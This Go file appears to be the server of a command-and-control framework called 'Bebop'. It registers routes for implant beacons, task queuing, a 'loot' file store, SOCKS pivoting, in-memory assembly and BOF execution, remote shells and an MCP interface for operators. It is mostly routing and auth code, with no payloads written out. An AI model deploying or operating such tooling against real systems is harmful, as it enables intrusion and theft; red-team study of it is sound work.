package server

import (
	"context"
	"crypto/rsa"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"c2/auth"
	"c2/models"
	"c2/store"
	"c2/ui"

	"nhooyr.io/websocket"
)

func Run(port int, host string, s *store.Store, privKey *rsa.PrivateKey, beaconSrc string, p saver, toRestart []*models.Listener, sl *SessionListener, hub *Hub, authSvc *auth.Auth, jwtKey []byte) (*http.Server, *ListenerManager, error) {
	lm := NewListenerManager()
	socksMgr := NewSocksManager(s, hub, host)
	if sl != nil {
		sl.socksMgr = socksMgr
	}
	h := NewHandler(s, privKey, beaconSrc, lm, p, port, sl, hub, socksMgr, authSvc, jwtKey)

	beaconMux := newBeaconMux(h)
	for _, l := range toRestart {
		if err := lm.Start(l, beaconMux); err != nil {
			ui.Error("listener", fmt.Sprintf("%q failed: %v", l.Name, err))
		} else {
			ui.Success("listener", fmt.Sprintf("%q on 0.0.0.0:%d", l.Name, l.Port))
		}
	}

	mux := http.NewServeMux()

	// Beacon protocol routes
	mux.HandleFunc("GET /api/pubkey", h.HandleGetPubKey)
	mux.HandleFunc("POST /api/register", h.HandleRegister)
	mux.HandleFunc("POST /api/checkin", h.HandleCheckin)
	mux.HandleFunc("POST /api/result", h.HandleResult)

	// Auth routes
	mux.HandleFunc("POST /api/auth/login", cors(h.HandleLogin))
	mux.HandleFunc("POST /api/auth/logout", cors(h.authMiddleware(h.HandleLogout)))
	mux.HandleFunc("POST /api/ws-ticket", cors(h.authMiddleware(h.HandleWSTicket)))
	mux.HandleFunc("OPTIONS /api/auth/login", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("OPTIONS /api/auth/logout", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("OPTIONS /api/ws-ticket", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("GET /api/mcp/status", cors(h.authMiddleware(h.HandleMCPStatus)))
	mux.HandleFunc("GET /api/mcp/token", cors(h.authMiddleware(h.HandleMCPToken)))
	mux.HandleFunc("GET /api/mcp", cors(h.mcpHTTPAuthMiddleware(h.HandleMCPStream)))
	mux.HandleFunc("POST /api/mcp", cors(h.mcpHTTPAuthMiddleware(h.HandleMCPRPC)))
	mux.HandleFunc("OPTIONS /api/mcp/status", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("OPTIONS /api/mcp/token", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("OPTIONS /api/mcp", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Operator JSON API routes (CORS enabled)
	mux.HandleFunc("GET /api/sessions", cors(h.authMiddleware(h.HandleGetSessions)))
	mux.HandleFunc("POST /api/task", cors(h.authMiddleware(h.HandleQueueTask)))
	mux.HandleFunc("OPTIONS /api/task", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("GET /api/results/{id}", cors(h.authMiddleware(h.HandleGetResults)))
	mux.HandleFunc("OPTIONS /api/results/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("POST /api/build", cors(h.authMiddleware(h.HandleBuild)))
	mux.HandleFunc("OPTIONS /api/build", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("DELETE /api/sessions/{id}", cors(h.authMiddleware(h.HandleKillBeacon)))
	mux.HandleFunc("DELETE /api/session/{id}", cors(h.authMiddleware(h.HandleCloseSession)))
	mux.HandleFunc("OPTIONS /api/sessions/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("OPTIONS /api/session/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Listener management routes
	mux.HandleFunc("GET /api/listeners", cors(h.authMiddleware(h.HandleListListeners)))
	mux.HandleFunc("POST /api/listeners", cors(h.authMiddleware(h.HandleCreateListener)))
	mux.HandleFunc("OPTIONS /api/listeners", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("DELETE /api/listeners/{id}", cors(h.authMiddleware(h.HandleDeleteListener)))
	mux.HandleFunc("OPTIONS /api/listeners/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Event log routes
	mux.HandleFunc("GET /api/events", cors(h.authMiddleware(h.HandleGetEvents)))
	mux.HandleFunc("POST /api/events", cors(h.authMiddleware(h.HandlePostEvent)))
	mux.HandleFunc("OPTIONS /api/events", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Operator chat routes
	mux.HandleFunc("GET /api/chat", cors(h.authMiddleware(h.HandleChatList)))
	mux.HandleFunc("POST /api/chat", cors(h.authMiddleware(h.HandleChatPost)))
	mux.HandleFunc("OPTIONS /api/chat", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Terminal state routes
	mux.HandleFunc("GET /api/terminal/{id}", cors(h.authMiddleware(h.HandleGetTerminal)))
	mux.HandleFunc("PUT /api/terminal/{id}", cors(h.authMiddleware(h.HandlePutTerminal)))
	mux.HandleFunc("POST /api/terminal/{id}", cors(h.authMiddleware(h.HandlePutTerminal)))
	mux.HandleFunc("OPTIONS /api/terminal/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// File transfer routes
	mux.HandleFunc("POST /api/upload", cors(h.authMiddleware(h.HandleUpload)))
	mux.HandleFunc("OPTIONS /api/upload", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("GET /api/loot", cors(h.authMiddleware(h.HandleListFiles)))
	mux.HandleFunc("OPTIONS /api/loot", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("GET /api/files/{label}", cors(h.authMiddleware(h.HandleGetFile)))
	mux.HandleFunc("DELETE /api/files/{label}", cors(h.authMiddleware(h.HandleDeleteFile)))
	mux.HandleFunc("OPTIONS /api/files/{label}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Session mode routes
	mux.HandleFunc("POST /api/interactive", cors(h.authMiddleware(h.HandleInteractive)))
	mux.HandleFunc("OPTIONS /api/interactive", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// SOCKS5 proxy routes
	mux.HandleFunc("POST /api/socks", cors(h.authMiddleware(h.HandleStartSocks)))
	mux.HandleFunc("GET /api/socks", cors(h.authMiddleware(h.HandleListSocks)))
	mux.HandleFunc("DELETE /api/socks/{id}", cors(h.authMiddleware(h.HandleStopSocks)))
	mux.HandleFunc("OPTIONS /api/socks", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("OPTIONS /api/socks/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Execute-assembly routes
	mux.HandleFunc("POST /api/exec-assembly", cors(h.authMiddleware(h.HandleExecAssembly)))
	mux.HandleFunc("OPTIONS /api/exec-assembly", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("POST /api/inline-assembly", cors(h.authMiddleware(h.HandleInlineAssembly)))
	mux.HandleFunc("OPTIONS /api/inline-assembly", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("POST /api/bof", cors(h.authMiddleware(h.HandleBOF)))
	mux.HandleFunc("OPTIONS /api/bof", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Assembly library routes
	mux.HandleFunc("POST /api/assemblies", cors(h.authMiddleware(h.HandleAssemblyUpload)))
	mux.HandleFunc("GET /api/assemblies", cors(h.authMiddleware(h.HandleAssemblyList)))
	mux.HandleFunc("DELETE /api/assemblies/{name}", cors(h.authMiddleware(h.HandleAssemblyDelete)))
	mux.HandleFunc("OPTIONS /api/assemblies", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("OPTIONS /api/assemblies/{name}", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("POST /api/library", cors(h.authMiddleware(h.HandleLibraryUpload)))
	mux.HandleFunc("GET /api/library", cors(h.authMiddleware(h.HandleLibraryList)))
	mux.HandleFunc("DELETE /api/library/{name}", cors(h.authMiddleware(h.HandleLibraryDelete)))
	mux.HandleFunc("OPTIONS /api/library", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("OPTIONS /api/library/{name}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// WebSocket for session results
	if sl != nil {
		mux.HandleFunc("/ws/session/", func(w http.ResponseWriter, r *http.Request) {
			if _, ok := h.validateWSToken(w, r); !ok {
				return
			}
			handleSessionWebSocket(w, r, sl)
		})
		mux.HandleFunc("/ws/shell/", func(w http.ResponseWriter, r *http.Request) {
			if _, ok := h.validateWSToken(w, r); !ok {
				return
			}
			handleShellWebSocket(w, r, sl, sl.shellMgr)
		})
	}

	// Unified operator WebSocket
	mux.HandleFunc("/ws/operator", handleOperatorWebSocket(hub, s, h))

	StartTokenPurge()

	ui.Success("ready", fmt.Sprintf("0.0.0.0:%d (host: %s)", port, host))
	ui.Quote("The Bebop is online. Carry that weight.")
	ui.Blank()

	srv := &http.Server{
		Addr:        fmt.Sprintf(":%d", port),
		Handler:     mux,
		IdleTimeout: 120 * time.Second,
	}
	go func() {
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			ui.Errorf("server", "%v", err)
		}
	}()
	return srv, lm, nil
}

type contextKey string

const operatorKey contextKey = "operator"

func validateMCPToken(raw string) (mcpAuthContext, bool) {
	configured := configuredMCPAuth()
	raw = strings.TrimSpace(raw)
	if configured.Secret == "" || raw == "" {
		return mcpAuthContext{}, false
	}
	if operator, ok := parseMCPOperatorToken(raw, configured.Secret); ok {
		return mcpAuthContext{Operator: operator, Scopes: configured.Scopes}, true
	}
	return mcpAuthContext{}, false
}

func mcpMutationAllowed() bool {
	value := strings.ToLower(strings.TrimSpace(os.Getenv("BEBOP_MCP_ALLOW_MUTATION")))
	switch value {
	case "0", "false", "no", "off":
		return false
	default:
		return true
	}
}

func bearerToken(r *http.Request) string {
	token := r.Header.Get("Authorization")
	if !strings.HasPrefix(token, "Bearer ") {
		return ""
	}
	return strings.TrimSpace(token[7:])
}

func (h *Handler) validateWSToken(w http.ResponseWriter, r *http.Request) (string, bool) {
	if username, ok := h.consumeWSTicket(r.URL.Query().Get("ticket")); ok {
		return username, true
	}
	if legacyWSQueryTokenAllowed() {
		token := r.URL.Query().Get("token")
		if token != "" {
			username, err := auth.ValidateToken(token, h.jwtKey)
			if err == nil {
				return username, true
			}
		}
	}
	http.Error(w, "unauthorized", http.StatusUnauthorized)
	return "", false
}

func legacyWSQueryTokenAllowed() bool {
	value := strings.ToLower(strings.TrimSpace(os.Getenv("BEBOP_WS_LEGACY_QUERY_TOKEN")))
	return value == "1" || value == "true" || value == "yes" || value == "on"
}

func (h *Handler) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		raw := bearerToken(r)
		if raw == "" {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		username, err := auth.ValidateToken(raw, h.jwtKey)
		if err != nil {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		if !h.operatorExists(username) {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		ctx := context.WithValue(r.Context(), operatorKey, username)
		next(w, r.WithContext(ctx))
	}
}

func (h *Handler) mcpHTTPAuthMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		raw := bearerToken(r)
		if raw == "" {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		if authCtx, ok := validateMCPToken(raw); ok {
			if !h.operatorExists(authCtx.Operator) {
				http.Error(w, "unauthorized", http.StatusUnauthorized)
				return
			}
			ctx := context.WithValue(r.Context(), operatorKey, authCtx.Operator)
			ctx = context.WithValue(ctx, mcpAuthKey, authCtx)
			next(w, r.WithContext(ctx))
			return
		}
		username, err := auth.ValidateToken(raw, h.jwtKey)
		if err != nil {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		if !h.operatorExists(username) {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		ctx := context.WithValue(r.Context(), operatorKey, username)
		next(w, r.WithContext(ctx))
	}
}

func (h *Handler) operatorExists(username string) bool {
	if h == nil || h.authSvc == nil {
		return true
	}
	username = strings.TrimSpace(username)
	return username != "" && h.authSvc.OperatorExists(username)
}

func cors(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")
		if allowedOrigin(origin) {
			if origin == "" {
				w.Header().Set("Access-Control-Allow-Origin", "*")
			} else {
				w.Header().Set("Access-Control-Allow-Origin", origin)
				w.Header().Add("Vary", "Origin")
			}
		}
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, Accept, MCP-Protocol-Version, Mcp-Session-Id")
		if r.Method == http.MethodOptions {
			if origin != "" && !allowedOrigin(origin) {
				http.Error(w, "origin not allowed", http.StatusForbidden)
				return
			}
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next(w, r)
	}
}

func configuredOrigins() []string {
	raw := strings.TrimSpace(os.Getenv("BEBOP_ALLOWED_ORIGINS"))
	if raw == "" {
		return nil
	}
	parts := strings.Split(raw, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

func allowedOrigin(origin string) bool {
	allowed := configuredOrigins()
	if len(allowed) == 0 {
		return true
	}
	if origin == "" {
		return true
	}
	for _, candidate := range allowed {
		if candidate == "*" || candidate == origin {
			return true
		}
	}
	return false
}

func acceptOperatorWebSocket(w http.ResponseWriter, r *http.Request) (*websocket.Conn, error) {
	allowed := configuredOrigins()
	opts := &websocket.AcceptOptions{}
	if len(allowed) == 0 || (len(allowed) == 1 && allowed[0] == "*") {
		opts.InsecureSkipVerify = true
	} else {
		opts.OriginPatterns = webSocketOriginPatterns(allowed)
	}
	return websocket.Accept(w, r, opts)
}

func webSocketOriginPatterns(allowed []string) []string {
	out := make([]string, 0, len(allowed))
	for _, candidate := range allowed {
		candidate = strings.TrimSpace(candidate)
		if candidate == "" {
			continue
		}
		if candidate == "*" {
			out = append(out, candidate)
			continue
		}
		if parsed, err := url.Parse(candidate); err == nil && parsed.Host != "" &&
			(parsed.Scheme == "http" || parsed.Scheme == "https") {
			out = append(out, parsed.Host)
			continue
		}
		out = append(out, candidate)
	}
	return out
}

func handleSessionWebSocket(w http.ResponseWriter, r *http.Request, sl *SessionListener) {
	parts := r.URL.Path
	idStr := parts[len("/ws/session/"):]
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid beacon id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	conn, err := acceptOperatorWebSocket(w, r)
	if err != nil {
		return
	}
	defer conn.CloseNow()

	ch := make(chan []byte, 64)
	sl.Subscribe(beaconID, ch)
	defer sl.Unsubscribe(beaconID, ch)

	ctx := conn.CloseRead(r.Context())
	for {
		select {
		case <-ctx.Done():
			conn.Close(websocket.StatusNormalClosure, "")
			return
		case msg := <-ch:
			if err := conn.Write(ctx, websocket.MessageText, msg); err != nil {
				return
			}
		}
	}
}
